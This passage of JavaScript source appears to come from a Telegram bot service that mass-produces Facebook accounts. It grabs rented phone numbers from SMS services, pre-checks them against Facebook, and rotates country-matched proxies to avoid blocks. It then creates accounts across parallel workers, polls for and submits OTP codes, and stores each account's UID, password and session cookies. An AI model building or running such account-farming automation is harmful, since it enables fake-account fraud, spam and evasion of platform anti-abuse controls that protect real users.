      btnNav('🔑 API Key', 'voltx:setkey'),
    ]);
    if (run?.running) {
      rows.push([btnBad('🛑 Stop Active Run', 'menu:stop')]);
    }
    rows.push([
      btnOk('🔄 Refresh', 'menu:voltx'),
      btnNav('⬅️ Main Menu', 'menu:home'),
    ]);

    const kb = { inline_keyboard: rows };
    if (editMsgId) await editMessage(chatId, editMsgId, txt, kb);
    else await sendMessage(chatId, txt, kb);
  }

  async function renderVoltxRanges(chatId, uid, page = 0, forceRefresh = false, editMsgId = null) {
    const { apiKey, baseUrl } = resolveVoltxCreds(uid);
    if (!apiKey) {
      await sendMessage(chatId, '⚠️ Set your <b>Voltx API Key</b> first before browsing live ranges.', {
        inline_keyboard: [[btnOk('🔑 Set Voltx API Key', 'voltx:setkey'), btnNav('⬅️ Back', 'menu:voltx')]],
      });
      return;
    }

    let cached = voltxRangeCache.get(uid);
    if (forceRefresh || !cached || Date.now() - cached.ts > 20000) {
      if (!editMsgId) {
        await sendMessage(chatId, '⏳ Fetching live ranges from Voltx SMS (<code>/liveaccess</code> + <code>/console</code>)...');
      }
      const res = await fetchVoltxLiveRanges(baseUrl, apiKey);
      if (!res.ok) {
        await sendMessage(
          chatId,
          `❌ <b>Voltx Range Fetch Failed</b>\n<blockquote><code>${escapeHtml(res.error || 'Unknown error')}</code> (code ${res.code || 0})</blockquote>`,
          { inline_keyboard: [[btnOk('🔑 Update API Key', 'voltx:setkey'), btnNav('⬅️ Back', 'menu:voltx')]] }
        );
        return;
      }
      cached = { ts: Date.now(), ranges: res.ranges, servicesCount: res.servicesCount, hitsCount: res.hitsCount };
      voltxRangeCache.set(uid, cached);
    }

    const list = cached.ranges || [];
    const perPage = 8;
    const totalPages = Math.max(1, Math.ceil(list.length / perPage));
    const safePage = Math.max(0, Math.min(page, totalPages - 1));
    const slice = list.slice(safePage * perPage, safePage * perPage + perPage);

    const lines = [
      `📋 <b>VOLTX LIVE RANGES (${list.length} active)</b>`,
      DIVIDER,
      `<i>Tap any range button below to select it for Auto FB Create + Auto OTP:</i>`,
      ``,
    ];
    const rows = [];
    slice.forEach((r, idx) => {
      const n = safePage * perPage + idx + 1;
      const fbBadge = r.isFb ? '🔥FB ' : '';
      const svcStr = r.sidsList.slice(0, 3).join(', ') || 'Active';
      const btnTitle = `${fbBadge}${r.label} (${r.iso !== '??' ? r.iso : r.rid}) • ${r.hits}h`;
      lines.push(
        `${n}. ${r.isFb ? '🔥' : '📡'} <code>${escapeHtml(r.label)}</code> → RID <code>${escapeHtml(r.rid)}</code> (${escapeHtml(r.country)}) • <i>${escapeHtml(svcStr)}</i> [${r.hits}]`
      );
      if (idx % 2 === 0) rows.push([btnOk(btnTitle.slice(0, 32), `voltx:pick:${r.rid}`)]);
      else rows[rows.length - 1].push(btnOk(btnTitle.slice(0, 32), `voltx:pick:${r.rid}`));
    });
    if (slice.length === 0) {
      lines.push('<i>No ranges currently in /liveaccess or /console feed. You can enter a custom Range ID manually!</i>');
    }

    const navRow = [];
    if (safePage > 0) navRow.push(btnNav('◀️ Prev', `voltx:ranges:${safePage - 1}`));
    navRow.push(btnNav(`🔄 Refresh (${safePage + 1}/${totalPages})`, `voltx:ranges_ref:${safePage}`));
    if (safePage + 1 < totalPages) navRow.push(btnNav('Next ▶️', `voltx:ranges:${safePage + 1}`));
    rows.push(navRow);
    rows.push([
      btnNav('✏️ Enter Custom RID', 'voltx:custom_rid'),
      btnNav('⬅️ Voltx Menu', 'menu:voltx'),
    ]);

    const txt = lines.join('\n');
    const kb = { inline_keyboard: rows };
    if (editMsgId) await editMessage(chatId, editMsgId, txt, kb);
    else await sendMessage(chatId, txt, kb);
  }

  async function syncVoltxOtpsForPending(chatId, uid) {
    const { apiKey, baseUrl } = resolveVoltxCreds(uid);
    if (!apiKey) {
      await sendMessage(chatId, '⚠️ Voltx API key not set. Open <b>📡 Voltx Auto FB</b> to configure.', {
        inline_keyboard: [[btnOk('📡 Voltx Auto FB', 'menu:voltx'), btnNav('⬅️ OTP Queue', 'menu:otp')]],
      });
      return;
    }
    const items = readUserPending(uid);
    if (items.length === 0) {
      await sendMessage(chatId, 'ℹ️ OTP Queue is currently empty.', {
        inline_keyboard: [[btnNav('⬅️ OTP Queue', 'menu:otp')]],
      });
      return;
    }
    const res = await voltxGetSuccessOtps(baseUrl, apiKey);
    if (!res.ok) {
      await sendMessage(chatId, `❌ Voltx OTP fetch failed: <code>${escapeHtml(res.message)}</code>`, {
        inline_keyboard: [[btnNav('⬅️ OTP Queue', 'menu:otp')]],
      });
      return;
    }
    const cfg = readUserConfig(uid);
    const userCookie = readUserCookies(uid);
    let verifiedCount = 0;
    let matchedCount = 0;
    const logs = [];
    const remaining = [...items];

    for (let idx = remaining.length - 1; idx >= 0; idx--) {
      const item = remaining[idx];
      const hit = res.otps.find((o) => phoneDigitsMatch(o.number, item.phone) && extractFbOtpFromSms(o.message));
      if (!hit) continue;
      matchedCount++;
      const code = extractFbOtpFromSms(hit.message);
      const confirmRes = item.flow === 'recovery'
        ? await submitRecoveryOtpAndLogin({ ...item }, code, item.pass || cfg.password, cfg)
        : await performOtpConfirm({ ...item }, code, cfg, userCookie);
      if (confirmRes.status === 'OK') {
        verifiedCount++;
        const finalPass = confirmRes.pass || item.pass || cfg.password || '';
        storeUserAccount(uid, {
          name: item.name,
          phone: item.phone,
          pass: finalPass,
          uid: confirmRes.uid,
          status: 'OK',
          confirmed: true,
          cookies: confirmRes.cookies,
        });
        remaining.splice(idx, 1);
        const usersMap = readUsersMap();
        if (usersMap[uid]) {
          usersMap[uid].totalOk += 1;
          writeUsersMap(usersMap);
        }
        const cstr = formatCookieHeader(confirmRes.cookies || {});
        logs.push(`✅ <code>+${escapeHtml(item.phone)}</code> → OTP <code>${escapeHtml(code)}</code>\n   <code>${escapeHtml(confirmRes.uid)}|${escapeHtml(finalPass)}|${escapeHtml(cstr.slice(0, 120))}</code>`);
      } else {
        logs.push(`⚠️ <code>+${escapeHtml(item.phone)}</code> → code <code>${escapeHtml(code)}</code> → ${escapeHtml(confirmRes.err || confirmRes.status)}`);
      }
    }
    writeUserPending(uid, remaining);

    await sendMessage(
      chatId,
      [
        `📡 <b>VOLTX OTP SYNC COMPLETE</b>`,
        DIVIDER,
        `📥 <b>Voltx OTPs Scanned:</b> <code>${res.otps.length}</code>`,
        `🎯 <b>Matched Pending:</b> <code>${matchedCount}</code>  •  ✅ <b>Verified:</b> <code>${verifiedCount}</code>`,
        logs.length > 0 ? `\n${logs.slice(0, 8).join('\n')}` : `\n<i>No matching new OTPs found in /success-otp for your pending numbers yet.</i>`,
      ].join('\n'),
      {
        inline_keyboard: [
          [btnOk('📦 Accounts Vault', 'menu:accounts'), btnNav('🔐 OTP Queue', 'menu:otp')],
        ],
      }
    );
  }

  async function syncLamixOtpsForPending(chatId, uid) {
    const cfg = readUserConfig(uid);
    const lamixTok = (cfg.lamix_token || process.env.LAMIX_TOKEN || '').trim();
    if (!lamixTok) {
      await sendMessage(chatId, '⚠️ Lamix Token not set. Open <b>💻 PC clone → 🔑 Set Lamix Token</b> first.', {
        inline_keyboard: [[btnOk('🔑 Set Lamix Token', 'pc:set_lamix'), btnNav('⬅️ OTP Queue', 'menu:otp')]],
      });
      return;
    }
    const items = readUserPending(uid);
    if (items.length === 0) {
      await sendMessage(chatId, 'ℹ️ OTP Queue is currently empty.', {
        inline_keyboard: [[btnNav('⬅️ OTP Queue', 'menu:otp')]],
      });
      return;
    }
    const res = await fetchLamixMessages(lamixTok, 80);
    if (!res.ok) {
      await sendMessage(chatId, `❌ Lamix SMS fetch failed: <code>${escapeHtml(res.error || 'error')}</code>`, {
        inline_keyboard: [[btnNav('⬅️ OTP Queue', 'menu:otp')]],
      });
      return;
    }
    const userCookie = readUserCookies(uid);
    let verifiedCount = 0;
    let matchedCount = 0;
    const logs = [];
    const remaining = [...items];

    for (let idx = remaining.length - 1; idx >= 0; idx--) {
      const item = remaining[idx];
      let matchedCode = '';
      for (const row of res.messages) {
        const f = getLamixMsgFields(row);
        if (!f.message) continue;
        if (!phoneDigitsMatch(f.number, item.phone)) continue;
        const c = extractFbOtpFromSms(f.message);
        if (c) {
          matchedCode = c;
          break;
        }
      }
      if (!matchedCode) continue;
      matchedCount++;
      const confirmRes = item.flow === 'recovery'
        ? await submitRecoveryOtpAndLogin({ ...item }, matchedCode, item.pass || cfg.password, cfg)
        : await performOtpConfirm({ ...item }, matchedCode, cfg, userCookie);
      if (confirmRes.status === 'OK') {
        verifiedCount++;
        const finalPass = confirmRes.pass || item.pass || cfg.password || '';
        storeUserAccount(uid, {
          name: item.name,
          phone: item.phone,
          pass: finalPass,
          uid: confirmRes.uid,
          status: 'OK',
          confirmed: true,
          engine: item.flow === 'recovery' ? 'PC_CLONE_LAMIX' : undefined,
          cookies: confirmRes.cookies,
        });
        remaining.splice(idx, 1);
        const usersMap = readUsersMap();
        if (usersMap[uid]) {
          usersMap[uid].totalOk += 1;
          writeUsersMap(usersMap);
        }
        const cstr = formatCookieHeader(confirmRes.cookies || {});
        logs.push(`✅ <code>+${escapeHtml(item.phone)}</code> → OTP <code>${escapeHtml(matchedCode)}</code>\n   <code>${escapeHtml(confirmRes.uid)}|${escapeHtml(finalPass)}|${escapeHtml(cstr.slice(0, 120))}</code>`);
      } else {
        logs.push(`⚠️ <code>+${escapeHtml(item.phone)}</code> → code <code>${escapeHtml(matchedCode)}</code> → ${escapeHtml(confirmRes.err || confirmRes.status)}`);
      }
    }
    writeUserPending(uid, remaining);

    await sendMessage(
      chatId,
      [
        `📡 <b>LAMIX SMS OTP SYNC COMPLETE</b>`,
        DIVIDER,
        `📥 <b>Lamix Messages Scanned:</b> <code>${res.messages.length}</code>`,
        `🎯 <b>Matched Pending:</b> <code>${matchedCount}</code>  •  ✅ <b>Logged In:</b> <code>${verifiedCount}</code>`,
        logs.length > 0 ? `\n${logs.slice(0, 8).join('\n')}` : `\n<i>No matching new Facebook OTP found in Lamix inbox yet.</i>`,
      ].join('\n'),
      {
        inline_keyboard: [
          [btnOk('📦 Accounts Vault', 'menu:accounts'), btnNav('🔐 OTP Queue', 'menu:otp')],
        ],
      }
    );
  }

  async function startVoltxAutoRun(chatId, user, rid, targetCount) {
    const st = readSettings();
    const cfg = readUserConfig(user.id);
    const { apiKey, baseUrl } = resolveVoltxCreds(user.id);
    const cleanRid = normalizeVoltxRid(rid);

    if (!apiKey) {
      await sendMessage(chatId, '⚠️ Voltx API key is not set yet.', {
        inline_keyboard: [[btnOk('🔑 Set Voltx API Key', 'voltx:setkey')]],
      });
      return;
    }
    if (!cleanRid) {
      await sendMessage(chatId, '⚠️ Please select a Range first.', {
        inline_keyboard: [[btnOk('📋 Browse Live Ranges', 'voltx:ranges:0')]],
      });
      return;
    }
    if (!cfg.password || cfg.password.length < 6) {
      await sendMessage(chatId, '⚠️ Set a default Facebook password (min 6 chars) before starting.', {
        inline_keyboard: [[btnOk('🔒 Set Password', 'set:pw'), btnNav('⬅️ Voltx Menu', 'menu:voltx')]],
      });
      return;
    }
    const existing = activeRuns.get(user.id);
    if (existing?.running) {
      await sendMessage(chatId, '⏳ A run is already in progress. Stop it first or wait for completion.', {
        inline_keyboard: [[btnBad('🛑 Stop Active Run', 'menu:stop')]],
      });
      return;
    }
    const isAdmin = isUserAdmin(user, st);
    const remainingQuota = Math.max(0, user.dailyLimit - user.usedToday);
    if (!isAdmin && remainingQuota <= 0) {
      await sendMessage(chatId, `🚫 Daily quota reached (${user.usedToday}/${user.dailyLimit}).`, {
        inline_keyboard: [[btnNav('⬅️ Voltx Menu', 'menu:voltx')]],
      });
      return;
    }

    const totalTarget = isAdmin ? targetCount : Math.min(targetCount, remainingQuota);
    const runState = {
      running: true,
      abortRequested: false,
      total: totalTarget,
      completed: 0,
      okCount: 0,
      pendingCount: 0,
      failCount: 0,
      currentNumber: null,
      startedAt: Date.now(),
    };
    activeRuns.set(user.id, runState);

    const statusRes = await sendMessage(
      chatId,
      [
        `📡 <b>VOLTX AUTO FB • STARTING</b>`,
        DIVIDER,
        `🎯 <b>Range RID:</b> <code>${escapeHtml(cleanRid)}</code>  •  <b>Target:</b> <code>${totalTarget}</code> account(s)`,
        `⏳ Allocating numbers, creating FB accounts &amp; watching <code>/success-otp</code>...`,
      ].join('\n'),
      { inline_keyboard: [[btnBad('🛑 Stop Run', 'menu:stop')]] }
    );
    const progressMsgId = statusRes.ok && statusRes.result?.message_id ? statusRes.result.message_id : null;

    pushBotLog(`User ${user.id} started Voltx auto run (RID=${cleanRid}, target=${totalTarget})`);
    appendUserLog(user.id, `VOLTX AUTO STARTED: RID=${cleanRid}, count=${totalTarget}`);

    (async () => {
      const userProxies = readUserProxies(user.id);
      const proxyPool = userProxies.length > 0 ? userProxies : st.shareGlobalProxies ? readGlobalProxies() : [];
      const userBaseCookie = readUserCookies(user.id);
      const badProxies = new Set();
      const seenNumbers = new Set();
      const threads = Math.max(1, Math.min(4, Number(cfg.threads ?? 3), totalTarget));
      const watchMap = new Map(); // phone -> { phone, name, startedAt, item, done: false, countryIso, countryName }
      const seenOtpIds = new Set();
      const resendTasks = [];
      let allocatedTries = 0;
      const maxAllocTries = Math.max(totalTarget * 3, totalTarget + 4);
      let outOfStockHits = 0;
      let grabDoneCount = 0;
      let autoVerifiedCount = 0;
      let totalResentCount = 0;
      let lastEditAt = 0;
      let workersDone = false;

      // Pre-seed historical OTP IDs so old SMS on recycled numbers do not match
      const preOtps = await voltxGetSuccessOtps(baseUrl, apiKey);
      if (preOtps.ok) {
        for (const o of preOtps.otps) {
          if (o.otp_id) seenOtpIds.add(String(o.otp_id));
        }
      }

      const updateVoltxProgress = async (statusLine = '', force = false) => {
        if (!progressMsgId) return;
        const now = Date.now();
        if (!force && now - lastEditAt < 2500) return;
        lastEditAt = now;
        const waitingOtpCnt = Array.from(watchMap.values()).filter((w) => !w.done).length;
        await editMessage(
          chatId,
          progressMsgId,
          [
            `📡 <b>VOLTX AUTO FB (${threads}x • RID ${escapeHtml(cleanRid)})</b>`,
            DIVIDER,
            statusLine || `📱 <b>Active:</b> <code>${runState.currentNumber ? '+' + escapeHtml(runState.currentNumber) : 'Scanning...'}</code>`,
            `📊 <b>Progress:</b> <code>${renderProgressBar(runState.completed, totalTarget)}</code> (<code>${runState.completed}/${totalTarget}</code>)`,
            `✅ Ready: <code>${runState.okCount}</code> (⚡Auto-OTP: <code>${autoVerifiedCount}</code>)  •  ⏳ Waiting: <code>${waitingOtpCnt}</code>  •  🔁 Resends: <code>${totalResentCount}</code>  •  ❌ Fail: <code>${runState.failCount}</code>`,
          ].join('\n'),
          { inline_keyboard: [[btnBad('🛑 Stop Run', 'menu:stop')]] },
          { throttle: true, noRetry: true, minIntervalMs: force ? 1200 : 2500 }
        );
      };

      const markWatcherVerified = async (match, uidFound, cookiesFound, codeUsed = 'AUTO') => {
        if (!match || match.done) return;
        match.done = true;
        autoVerifiedCount += 1;
        runState.okCount += 1;
        runState.pendingCount = Math.max(0, runState.pendingCount - 1);
        storeUserAccount(user.id, {
          name: match.item.name,
          phone: match.phone,
          pass: cfg.password,
          uid: uidFound,
          status: 'OK',
          confirmed: true,
          cookies: cookiesFound,
        });
        const curPend = readUserPending(user.id).filter((p) => p.phone !== match.phone);
        writeUserPending(user.id, curPend);
        const usersMap = readUsersMap();
        if (usersMap[user.id]) {
          usersMap[user.id].totalOk += 1;
          writeUsersMap(usersMap);
        }
        const cstr = formatCookieHeader(cookiesFound || {});
        const cTag = match.countryIso ? ` [${escapeHtml(match.countryName || '')} • <b>${escapeHtml(match.countryIso)}</b>]` : '';
        await sendMessage(
          chatId,
          [
            `✅ <b>VOLTX AUTO-OTP VERIFIED!</b>`,
            DIVIDER,
            `👤 <b>Profile:</b> ${escapeHtml(match.item.name)}${cTag}`,
            `📱 <b>Number:</b> <code>+${escapeHtml(match.phone)}</code>  •  🔑 <b>OTP:</b> <code>${escapeHtml(codeUsed)}</code>`,
            `🆔 <b>UID|Pass:</b> <code>${escapeHtml(uidFound)}|${escapeHtml(cfg.password)}</code>`,
            ``,
            `<blockquote>🍪 <code>${escapeHtml(cstr.slice(0, 260))}${cstr.length > 260 ? '...' : ''}</code></blockquote>`,
          ].join('\n'),
          { inline_keyboard: [[btnOk('📦 View Accounts', 'menu:accounts'), btnNav('⬅️ Voltx Menu', 'menu:voltx')]] }
        );
      };

      // Background Voltx /success-otp Poller (runs concurrently with creation + up to 120s after)
      const otpWatcherLoop = (async () => {
        let postRunDeadline = 0;
        while (!runState.abortRequested) {
          const pendingWatchers = Array.from(watchMap.values()).filter((w) => !w.done);
          if (workersDone) {
            if (pendingWatchers.length === 0) break;
            if (!postRunDeadline) postRunDeadline = Date.now() + 120000;
            if (Date.now() > postRunDeadline) break;
          }
          if (pendingWatchers.length > 0) {
            const otpRes = await voltxGetSuccessOtps(baseUrl, apiKey);
            if (otpRes.ok && otpRes.otps.length > 0) {
              for (const row of otpRes.otps) {
                const oid = String(row.otp_id || `${row.number}_${row.time}`);
                if (seenOtpIds.has(oid)) continue;
                const match = pendingWatchers.find(
                  (w) => !w.done && phoneDigitsMatch(row.number, w.phone) && (!row.time || Number(row.time) >= w.startedAt - 20000)
                );
                if (!match) continue;
                seenOtpIds.add(oid);
                const code = extractFbOtpFromSms(row.message);
                if (!code) {
                  appendUserLog(user.id, `VOLTX SMS +${match.phone}: no OTP digits in "${String(row.message).slice(0, 60)}"`);
                  continue;
                }
                match.verifying = true;
                appendUserLog(user.id, `VOLTX OTP MATCHED +${match.phone} [${match.countryIso || 'PX'}] -> ${code}`);
                await updateVoltxProgress(
                  `📩 <b>OTP Received!</b> <code>+${escapeHtml(match.phone)}</code> [<b>${escapeHtml(match.countryIso || '')}</b>] → <code>${escapeHtml(code)}</code> (Verifying...)`,
                  true
                );
                const confirmRes = await performOtpConfirm({ ...match.item }, code, cfg, userBaseCookie);
                if (confirmRes.status === 'OK') {
                  await markWatcherVerified(match, confirmRes.uid, confirmRes.cookies, code);
                } else if (confirmRes.status === 'RETRY') {
                  match.verifying = false;
                  match.item = confirmRes.item;
                  upsertUserPending(user.id, confirmRes.item);
                } else {
                  match.verifying = false;
                  match.done = true;
                  appendUserLog(user.id, `VOLTX OTP VERIFY FAILED +${match.phone}: ${confirmRes.err || confirmRes.status}`);
                }
              }
            }
          }
          await new Promise((r) => setTimeout(r, 2200));
        }
      })();

      const worker = async (workerIdx) => {
        while (!runState.abortRequested) {
          if (grabDoneCount >= totalTarget) break;
          if (allocatedTries >= maxAllocTries || outOfStockHits >= 3) break;
          allocatedTries += 1;

          const grab = await voltxGetNum(baseUrl, apiKey, cleanRid);
          if (!grab.ok) {
            if (grab.outOfStock) {
              outOfStockHits += 1;
              appendUserLog(user.id, `VOLTX /getnum RID=${cleanRid} out of stock (${outOfStockHits}/3)`);
              await updateVoltxProgress(`⚠️ Range <code>${escapeHtml(cleanRid)}</code> out of stock (${outOfStockHits}/3)...`, true);
              await new Promise((r) => setTimeout(r, 1500));
              continue;
            }
            appendUserLog(user.id, `VOLTX /getnum err: ${grab.message}`);
            break;
          }
          outOfStockHits = 0;
          const phone = grab.noPlusNumber;
          if (!phone || seenNumbers.has(phone)) continue;
          seenNumbers.add(phone);

          const det = detectCountryFromNumber(`+${phone}`, cfg.cc, grab.country || '');
          const numIso = (cfg.auto_proxy_country !== false && det?.iso && det.iso !== '??')
            ? det.iso
            : (countryNameToIso(grab.country) || getCountryInfo(cfg.cc)[1]);
          const numCName = (det?.name && det.name !== 'Unknown') ? det.name : (grab.country || getCountryInfo(cfg.cc)[0]);

          // Optional GraphQL Free/Taken pre-check before FB signup (0-proxy Direct by default)
          const px = proxyPool.length > 0 ? selectSmartProxy(proxyPool, allocatedTries, badProxies, cfg.proxy_mode || 'rotate', cfg.proxy || null) : cfg.proxy || null;
          if (cfg.precheck_gql !== false) {
            try {
              const useDirectGql = cfg.gql_via_direct !== false;
              const gAdapted = adaptProxyForSession(useDirectGql ? null : px, {
                iso: numIso,
                autoCountry: cfg.auto_proxy_country !== false,
                refreshSession: cfg.auto_proxy_refresh !== false,
              });
              const gPx = useDirectGql ? null : gAdapted.url;
              let gql;
              try {
                gql = await checkNumberGraphql(`+${phone}`, {
                  cc: det?.cc || cfg.cc,
                  proxy: gPx,
                  strictProxy: cfg.strict_proxy !== false,
                  timeoutMs: 9000,
                  shouldAbort: () => runState.abortRequested,
                });
              } catch (err) {
                if (err && err.isProxyError && !useDirectGql && /407/.test(err.message || '') && px && (gAdapted.countryInjected || gAdapted.sessionInjected)) {
                  dynamicProxyTagBlacklist.add(proxyHealthKey(px));
                  gql = await checkNumberGraphql(`+${phone}`, {
                    cc: det?.cc || cfg.cc,
                    proxy: px,
                    strictProxy: cfg.strict_proxy !== false,
                    timeoutMs: 9000,
                    shouldAbort: () => runState.abortRequested,
                  });
                } else {
                  throw err;
                }
              }
              if (gql.status === 'taken') {
                appendUserLog(user.id, `VOLTX +${phone} [${numCName} • ${numIso}] GQL TAKEN -> skipping`);
                await updateVoltxProgress(`⏭ <code>+${escapeHtml(phone)}</code> [${escapeHtml(numIso)}] already on FB, grabbing next...`);
                continue;
              }
            } catch (err) {
              if (err && err.isProxyError && px) badProxies.add(proxyHealthKey(px));
            }
          }

          if (grabDoneCount >= totalTarget || runState.abortRequested) break;
          const slotIdx = ++grabDoneCount;
          runState.currentNumber = phone;
          const attemptStartedAt = Date.now();
          const pxInfo = adaptProxyForSession(px, {
            iso: numIso,
            autoCountry: cfg.auto_proxy_country !== false,
            refreshSession: false,
          });
          const pxTag = px ? `🌐 PX: <b>${escapeHtml(pxInfo.isoApplied || numIso)}</b>` : '🌐 Direct';
          await updateVoltxProgress(
            `🚀 <b>Creating #${slotIdx}/${totalTarget}:</b> <code>+${escapeHtml(phone)}</code> [<b>${escapeHtml(numCName)} • ${escapeHtml(numIso)}</b>] (${escapeHtml(grab.operator || 'Voltx')}) • ${pxTag}`,
            slotIdx === 1
          );

          const res = await runNodeAttempt(phone, cfg.password, cfg, px, {
            baseCookiesRaw: userBaseCookie,
            shouldAbort: () => runState.abortRequested,
            proxiesPool: proxyPool,
            badProxies,
            skipPrecheck: true,
            countryHint: grab.country || numCName,
            onDebug: (m) => appendUserLog(user.id, m),
          });

          if (res.debugHtml) saveUserDebugHtml(user.id, res.debugHtml);
          markUserDone(user.id, phone);
          runState.completed += 1;

          const usersMap = readUsersMap();
          const uRec = usersMap[user.id];
          if (uRec) {
            uRec.usedToday += 1;
            if (res.status === 'OK') uRec.totalOk += 1;
            else if (res.status === 'CONFIRM' || res.status === 'CHECKPOINT') uRec.totalPending += 1;
            else uRec.totalFail += 1;
            uRec.lastActiveAt = Date.now();
            writeUsersMap(usersMap);
          }

          if (res.status === 'OK') {
            runState.okCount += 1;
            storeUserAccount(user.id, {
              name: res.name,
              phone,
              pass: cfg.password,
              uid: res.uid,
              status: 'OK',
              confirmed: true,
              printer: res.printer,
              engine: res.engine,
              cookies: res.cookies,
            });
            const cstr = formatCookieHeader(res.cookies || {});
            await sendMessage(
              chatId,
              [
                `✅ <b>VOLTX ACCOUNT READY</b>`,
                DIVIDER,
                `👤 <b>Profile:</b> ${escapeHtml(res.name)} [${escapeHtml(numCName)} • <b>${escapeHtml(numIso)}</b>]`,
                `📱 <b>Number:</b> <code>+${escapeHtml(phone)}</code>`,
                `🔑 <b>UID|Pass:</b> <code>${escapeHtml(res.uid)}|${escapeHtml(cfg.password)}</code>`,
                `<blockquote>🍪 <code>${escapeHtml(cstr.slice(0, 260))}${cstr.length > 260 ? '...' : ''}</code></blockquote>`,
              ].join('\n'),
              { inline_keyboard: [[btnOk('📦 View Accounts', 'menu:accounts'), btnNav('⬅️ Voltx Menu', 'menu:voltx')]] }
            );
          } else if (res.status === 'CONFIRM' || res.status === 'CHECKPOINT') {
            runState.pendingCount += 1;
            if (res.pendingPayload) {
              res.pendingPayload.iso = numIso;
              res.pendingPayload.country = numCName;
              upsertUserPending(user.id, res.pendingPayload);
              const watcher = {
                phone,
                name: res.name,
                startedAt: attemptStartedAt,
                item: res.pendingPayload,
                done: false,
                countryIso: numIso,
                countryName: numCName,
              };
              watchMap.set(phone, watcher);

              const resendRounds = Math.max(0, Math.min(3, Number(cfg.auto_otp_resend ?? 2)));
              if (resendRounds > 0) {
                const rTask = (async () => {
                  await performAutoOtpResends(watcher.item, cfg, userBaseCookie, {
                    rounds: resendRounds,
                    shouldAbort: () => runState.abortRequested || watcher.done || watcher.verifying,
                    onStep: async (round, totalRounds, stepRes, curItem) => {
                      if (watcher.done || watcher.verifying) return;
                      watcher.item = curItem;
                      if (stepRes.alreadyConfirmed) {
                        await markWatcherVerified(watcher, stepRes.uid, stepRes.cookies, 'AUTO');
                        return;
                      }
                      if (stepRes.ok) {
                        totalResentCount += 1;
                        upsertUserPending(user.id, curItem);
                        appendUserLog(user.id, `VOLTX +${phone} [${numIso}] OTP Resent (${round}/${totalRounds}) via ${stepRes.via}`);
                        await updateVoltxProgress(
                          `🔁 <b>OTP Resent (${round}/${totalRounds}):</b> <code>+${escapeHtml(phone)}</code> [<b>${escapeHtml(numIso)}</b>]`,
                          false
                        );
                      } else {
                        appendUserLog(user.id, `VOLTX +${phone} [${numIso}] Resend ${round}/${totalRounds}: ${stepRes.reason || 'stopped'}`);
                      }
                    },
                  });
                })();
                resendTasks.push(rTask);
              }
            }
            await updateVoltxProgress(
              `📩 <b>OTP Sent!</b> <code>+${escapeHtml(phone)}</code> [<b>${escapeHtml(numCName)} • ${escapeHtml(numIso)}</b>] queued + auto-resending...`,
              true
            );
          } else {
            runState.failCount += 1;
            storeUserAccount(user.id, {
              name: res.name,
              phone,
              pass: cfg.password,
              status: res.status,
              confirmed: false,
              printer: res.printer,
              engine: res.engine,
              cookies: res.cookies,
              err: res.err,
            });
          }

          if (workerIdx === 0) await updateVoltxProgress();
        }
      };

      await Promise.all(Array.from({ length: threads }, (_, wi) => worker(wi)));
      if (resendTasks.length > 0) await Promise.allSettled(resendTasks);
      workersDone = true;

      const stillWaiting = Array.from(watchMap.values()).filter((w) => !w.done).length;
      if (stillWaiting > 0 && !runState.abortRequested) {
        await updateVoltxProgress(`📡 Waiting up to <code>120s</code> for <code>${stillWaiting}</code> pending Voltx OTP(s)...`, true);
      }
      await otpWatcherLoop;

      runState.running = false;
      runState.currentNumber = null;
      const unconfirmedLeft = Array.from(watchMap.values()).filter((w) => !w.done).length;
      pushBotLog(`User ${user.id} finished Voltx run: OK=${runState.okCount}, AutoOTP=${autoVerifiedCount}, Waiting=${unconfirmedLeft}, FAIL=${runState.failCount}`);

      const summaryTxt = [
        runState.abortRequested ? `🛑 <b>VOLTX RUN STOPPED</b>` : `🏁 <b>VOLTX AUTO RUN COMPLETED</b>`,
        DIVIDER,
        `🎯 <b>Range RID:</b> <code>${escapeHtml(cleanRid)}</code>  •  <b>Processed:</b> <code>${runState.completed}/${totalTarget}</code>`,
        `✅ <b>Ready Accounts:</b> <code>${runState.okCount}</code> (⚡Auto-OTP: <code>${autoVerifiedCount}</code>)`,
        `🔐 <b>Still Pending OTP:</b> <code>${unconfirmedLeft}</code>`,
        `❌ <b>Failed/Other:</b> <code>${runState.failCount}</code>`,
        outOfStockHits >= 3 ? `\n⚠️ <i>Stopped early because range ${escapeHtml(cleanRid)} went out of stock.</i>` : '',
      ].filter(Boolean).join('\n');

      if (progressMsgId) {
        await editMessage(chatId, progressMsgId, summaryTxt, {
          inline_keyboard: [
            [
              btnOk('📡 Voltx Menu', 'menu:voltx'),
              btnOk('📦 Accounts', 'menu:accounts'),
              btnNav('🔐 OTP Queue', 'menu:otp'),
            ],
            [btnNav('⬅️ Main Menu', 'menu:home')],
          ],
        });
      }
    })();
  }

  async function renderAdminHome(chatId, editMsgId) {
    const st = readSettings();
    const users = Object.values(readUsersMap());
    const pending = users.filter((u) => u.status === 'pending');
    const approved = users.filter((u) => u.status === 'approved');
    const blocked = users.filter((u) => u.status === 'blocked');
    const runningList = Array.from(activeRuns.entries()).filter(([, r]) => r.running);
    const globalPx = readGlobalProxies();
    const totalOk = users.reduce((s, u) => s + (u.totalOk || 0), 0);
    const totalOtp = users.reduce((s, u) => s + (u.totalPending || 0), 0);
    const totalUsedToday = users.reduce((s, u) => s + (u.usedToday || 0), 0);
    const upSec = startedAt ? Math.floor((Date.now() - startedAt) / 1000) : 0;
    const brand = st.brandName || DEFAULT_BRAND_NAME;

    const lines = [
      `👑 <b>${escapeHtml(brand)} • ADMIN CONTROL CENTER</b>`,
      DIVIDER,
      `🏷 <b>Brand:</b> <code>${escapeHtml(brand)}</code>  •  👑 <b>Owner:</b> ${escapeHtml(st.adminUsername)} (<code>${escapeHtml(st.adminId)}</code>)`,
      `📢 <b>Channel:</b> ${escapeHtml(getChannelHandle(st.channelUrl))}  •  🚦 <b>Status:</b> ${st.maintenanceMode ? '🛠 MAINTENANCE' : '🟢 LIVE'}`,
      ``,
      `👥 <b>Users:</b> <code>${users.length}</code> (✅ ${approved.length} • 🟡 ${pending.length} • 🚫 ${blocked.length})`,
      `📊 <b>Global Totals:</b> ✅ <code>${totalOk}</code>  •  🔐 <code>${totalOtp}</code>  •  🎯 Today: <code>${totalUsedToday}</code>`,
      `⚡ <b>Active Runs:</b> <code>${runningList.length}</code>  •  🌐 <b>Global Proxies:</b> <code>${globalPx.length}</code>  •  ⏱ <code>${formatDuration(upSec)}</code>`,
      `🛡 <b>Approval:</b> ${st.requireApproval ? '🟢 ON' : '🔴 OFF'}  •  <b>Force Join:</b> ${st.requireChannelJoin ? '🟢 ON' : '🔴 OFF'}  •  <b>Share PX:</b> ${st.shareGlobalProxies ? '🟢 ON' : '🔴 OFF'}`,
    ];

    const rows = [];
    if (pending.length > 0) {
